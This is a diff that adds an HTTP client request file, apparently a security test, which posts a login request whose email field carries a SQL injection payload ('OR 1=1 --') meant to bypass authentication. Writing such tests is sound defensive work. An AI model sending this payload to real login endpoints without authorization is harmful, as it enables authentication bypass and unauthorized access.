@@ -1,0 +1,23 @@
+meta {
+  name: SQL Injection by login
+  type: http
+  seq: 1
+}
+
+post {
+  url: {{base_url}}/auth/login
+  body: json
+  auth: inherit
+}
+
+body:json {
+  {
+    "email": "admin@test.com\" OR 1=1 --",
+    "password": "anything"
+  }
+}
+
+settings {
+  encodeUrl: true
+  timeout: 0
+}
